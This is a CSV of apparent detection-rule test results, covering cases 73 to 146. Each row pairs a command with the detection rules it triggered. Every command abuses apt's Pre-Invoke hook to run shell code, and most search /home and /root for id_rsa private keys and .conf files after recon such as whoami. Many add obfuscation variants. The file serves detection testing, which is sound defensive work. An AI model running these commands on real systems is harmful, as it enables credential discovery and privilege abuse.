ID,Command,Log File,Result,All Detected Rules
73,"sudo apt -o ""apt::update::pre-invoke::=find /home /root -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack73.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
74,"sudo apt -o ""apt::update::pre-invoke::=whoami; find /home -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack74.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
75,"sudo apt -o ""apt::update::pre-invoke::=find /home -name 'id_rsa' -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack75.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
76,"sudo apt -o ""apt::update::pre-invoke::=find /home /root 2>/dev/null"" update -qq",Shell_Invocation_via_Apt_attack76.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
77,"sudo apt -o ""apt::update::pre-invoke::=find /home /root -type f"" update -qq",Shell_Invocation_via_Apt_attack77.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
78,"sudo apt -o ""apt::update::pre-invoke::=whoami; find /home /root -type f"" update -qq",Shell_Invocation_via_Apt_attack78.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
79,"sudo apt -o ""apt::update::pre-invoke::=find /home /root -type f -iname '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack79.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
80,"apt update -qq -o ""apt::update::pre-invoke::=whoami; find /home /root -name 'id_rsa' -o -name '*.conf' 2>/dev/null""",Shell_Invocation_via_Apt_attack80.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
81,"apt -qq update -o ""apt::update::pre-invoke::=whoami; find /home /root -name 'id_rsa' -o -name '*.conf' 2>/dev/null""",Shell_Invocation_via_Apt_attack81.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
82,"apt -o ""apt::update::pre-invoke::=whoami; find /home /root -name '*.conf' -o -name 'id_rsa' 2>/dev/null"" -qq update",Shell_Invocation_via_Apt_attack82.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
83,"apt -o ""apt::update::pre-invoke::=find /home /root -name '*.conf' -o -name 'id_rsa' 2>/dev/null; whoami"" update -qq",Shell_Invocation_via_Apt_attack83.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
84,"apt -qq -o ""apt::update::pre-invoke::=find /home /root -name '*.conf'"" update",Shell_Invocation_via_Apt_attack84.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
85,"apt -o ""apt::update::pre-invoke::=find /home /root -name '*.conf' 2>/dev/null; whoami"" update -qq",Shell_Invocation_via_Apt_attack85.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
86,"apt-get update -qq -o ""apt::update::pre-invoke::=find /home /root -name '*.conf'; whoami""",Shell_Invocation_via_Apt_attack86.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
87,"apt update -o ""apt::update::pre-invoke::=find /home -name '*.conf' -o -name 'id_rsa'; whoami"" -qq",Shell_Invocation_via_Apt_attack87.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
88,"apt -o ""apt::update::pre-invoke::=whoami; find /home -name '*.conf' -o -name 'id_rsa'"" update -qq",Shell_Invocation_via_Apt_attack88.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
89,"apt -o ""apt::update::pre-invoke::=find /home -name '*.conf'; whoami"" -qq update",Shell_Invocation_via_Apt_attack89.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
90,"apt-get -o ""apt::update::pre-invoke::=find /home -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack90.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
91,"apt -qq update -o ""apt::update::pre-invoke::=whoami; find /home -name '*.conf' 2>/dev/null""",Shell_Invocation_via_Apt_attack91.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
92,"apt-get -o ""apt::update::pre-invoke::=find /home -name 'id_rsa' -o -name '*.conf'; whoami"" update -qq",Shell_Invocation_via_Apt_attack92.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
93,"apt -o ""apt::update::pre-invoke::=whoami; find /home -name '*.conf'"" -qq update",Shell_Invocation_via_Apt_attack93.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
94,"apt -o ""apt::update::pre-invoke::=find /home /root -name '*.conf' -o -name 'id_rsa'"" update -qq",Shell_Invocation_via_Apt_attack94.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
95,"apt update -qq -o ""APT::Update::Pre-Invoke::=whoami; find /home -name 'id_rsa' -o -name '*.conf' 2>/dev/null""",Shell_Invocation_via_Apt_attack95.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
96,"apt -qq -o ""APT::Update::Pre-Invoke::=find /home -name '*.conf'; whoami"" update",Shell_Invocation_via_Apt_attack96.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
97,"apt-get -qq -o ""APT::Update::Pre-Invoke::=whoami; find /home -name '*.conf'"" update",Shell_Invocation_via_Apt_attack97.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
98,"apt -o ""APT::Update::Pre-Invoke::=find /home -name '*.conf' 2>/dev/null; whoami"" -qq update",Shell_Invocation_via_Apt_attack98.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
99,"apt -o ""APT::Update::Pre-Invoke::=find /home -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack99.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
100,"apt -qq -o ""APT::Update::Pre-Invoke::=whoami; find /home /root -name '*.conf'"" update",Shell_Invocation_via_Apt_attack100.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
101,"apt-get -o ""APT::Update::Pre-Invoke::=whoami; find /home -name '*.conf'"" -qq update",Shell_Invocation_via_Apt_attack101.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
102,"apt -o ""APT::Update::Pre-Invoke::=find /home -name '*.conf' -o -name 'id_rsa'; whoami"" -qq update",Shell_Invocation_via_Apt_attack102.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
103,"apt -qq -o ""APT::Update::Pre-Invoke::=whoami; find /home -name '*.conf'"" update",Shell_Invocation_via_Apt_attack103.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
104,"apt -o ""APT::Update::Pre-Invoke::=find /home -name '*.conf'; whoami"" update -qq",Shell_Invocation_via_Apt_attack104.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
105,"apt update -o ""APT::Update::Pre-Invoke::=find /home -name 'id_rsa' -o -name '*.conf'"" -qq",Shell_Invocation_via_Apt_attack105.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
106,"apt-get -o ""APT::Update::Pre-Invoke::=find /home -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack106.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
107,"apt -o ""APT::Update::Pre-Invoke::=find /home -name '*.conf' 2>/dev/null"" update -qq",Shell_Invocation_via_Apt_attack107.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
108,"apt -o ""APT::Update::Pre-Invoke::=find /home -name '*.conf' -o -name 'id_rsa'"" -qq update",Shell_Invocation_via_Apt_attack108.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
109,"apt-get -qq update -o ""APT::Update::Pre-Invoke::=whoami; find /home -name '*.conf'""",Shell_Invocation_via_Apt_attack109.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
110,"sudo apt -o ""APT::Update::Pre-Invoke::=whoami; find /home /root -name 'id_rsa' -o -name '*.conf' 2>/dev/null"" update -qq",Shell_Invocation_via_Apt_attack110.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
111,"sudo apt -o ""APT::Update::Pre-Invoke::=whoami; find /home /root -iname 'id_rsa' -o -iname '*.conf' 2>/dev/null"" update -qq",Shell_Invocation_via_Apt_attack111.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
112,"sudo apt -o ""APT::Update::Pre-Invoke::=whoami; find /root /home -name 'id_rsa' -o -name '*.conf' 2>/dev/null"" update -qq",Shell_Invocation_via_Apt_attack112.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
113,"sudo apt -o ""APT::Update::Pre-Invoke::=whoami; find /home /root -name id_rsa -or -name '*.conf' 2>/dev/null"" update -qq",Shell_Invocation_via_Apt_attack113.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
114,"sudo apt -o ""APT::Update::Pre-Invoke::=whoami; find /home -name id_rsa -o -name '*.conf' 2>/dev/null"" update -qq",Shell_Invocation_via_Apt_attack114.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
115,"sudo apt -o ""APT::Update::Pre-Invoke::=id -un; find /home /root -name 'id_rsa' -o -name '*.conf' 2>/dev/null"" update -qq",Shell_Invocation_via_Apt_attack115.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
116,"sudo apt -o ""APT::Update::Pre-Invoke::='id -u'; find /home /root -name 'id_rsa' -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack116.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
117,"sudo apt -o ""APT::Update::Pre-Invoke::=printf root; find /home /root -name 'id_rsa' -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack117.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
118,"sudo apt -o ""APT::Update::Pre-Invoke::=whoami; find /home -type f -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack118.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
119,"sudo apt -o ""APT::Update::Pre-Invoke::=env whoami; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack119.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
120,"sudo apt -o ""APT::Update::Pre-Invoke::=sh -c 'whoami'; find /home /root -name 'id_rsa' -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack120.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
121,"sudo apt -o ""APT::Update::Pre-Invoke::=echo $(whoami); find /home /root -name 'id_rsa' -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack121.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
122,"sudo apt -o ""APT::Update::Pre-Invoke::=perl -e 'system(\""whoami\"")'; find /home /root -name 'id_rsa' -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack122.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
123,"sudo apt -o ""APT::Update::Pre-Invoke::=python3 -c 'import os; os.system(\""whoami\"")'; find /home /root -name 'id_rsa' -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack123.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
124,"sudo apt -o ""APT::Update::Pre-Invoke::=bash -c 'whoami'; find /home /root -name 'id_rsa' -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack124.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
125,"sudo apt -o ""APT::Update::Pre-Invoke::=/bin/sh -c whoami; find /home /root -name 'id_rsa' -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack125.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
126,"sudo apt -o ""APT::Update::Pre-Invoke::=whoami; find /home /root -type f \\( -name 'id_rsa' -o -name '*.conf' \\)"" update -qq",Shell_Invocation_via_Apt_attack126.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
127,"sudo apt -o ""APT::Update::Pre-Invoke::=whoami; find /home /root -name 'id_rsa' -a -readable -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack127.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
128,"sudo apt -o ""APT::Update::Pre-Invoke::=whoami; find /home /root -name 'id_rsa' -o -path '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack128.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
129,"sudo apt -o ""APT::Update::Pre-Invoke::=whoami; find /home /root -name 'id_rsa' -print -o -name '*.conf' -print"" update -qq",Shell_Invocation_via_Apt_attack129.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
130,"sudo apt -o ""APT::Update::Pre-Invoke::=whoami; find /home /root -name id_rsa -o -name *.conf"" update -qq",Shell_Invocation_via_Apt_attack130.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
131,"sudo apt -o ""APT::Update::Pre-Invoke::=whoami; find /home /root -type f -iname id_rsa -o -iname '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack131.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
132,"sudo apt -o ""APT::Update::Pre-Invoke::=getent passwd $(whoami); find /home /root -name 'id_rsa' -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack132.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
133,"sudo apt -o ""APT::Update::Pre-Invoke::=true; find /home /root -name 'id_rsa' -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack133.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
134,"sudo apt -o ""APT::Update::Pre-Invoke::=hostname; find /home /root -name 'id_rsa' -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack134.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | System Information Discovery | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
135,"sudo apt -o ""APT::Update::Pre-Invoke::=uname -a; find /home /root -name 'id_rsa' -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack135.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | System Information Discovery | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
136,"sudo apt -o ""APT::Update::Pre-Invoke::=id -u -n; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack136.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
137,"sudo apt -o ""APT::Update::Pre-Invoke::=echo $USER; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack137.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
138,"sudo apt -o ""APT::Update::Pre-Invoke::=printf '%s\n' $(whoami); find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack138.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
139,"sudo apt -o ""APT::Update::Pre-Invoke::=$(which whoami); find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack139.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
140,"sudo apt -o ""APT::Update::Pre-Invoke::=/usr/bin/whoami; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack140.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
141,"sudo apt -o ""APT::Update::Pre-Invoke::=/usr/bin/env whoami; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack141.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
142,"sudo apt -o ""APT::Update::Pre-Invoke::=awk 'BEGIN{system(\""whoami\"")}' ; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack142.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
143,"sudo apt -o ""APT::Update::Pre-Invoke::=perl -e 'exec(\""whoami\"")'; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack143.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
144,"sudo apt -o ""APT::Update::Pre-Invoke::=printf root\n; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack144.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
145,"sudo apt -o ""APT::Update::Pre-Invoke::=expr 0 + 1; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack145.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
146,"sudo apt -o ""APT::Update::Pre-Invoke::=echo admin; find /home /root -name id_rsa -o -name '*.conf'"" update -qq",Shell_Invocation_via_Apt_attack146.log,Trigger: Shell Invocation via Apt - Linux,Local System Accounts Discovery - Linux | Syslog Clearing or Removal Via System Utilities | Chmod Suspicious Directory | File Deletion | File and Directory Discovery - Linux | Shell Invocation via Apt - Linux
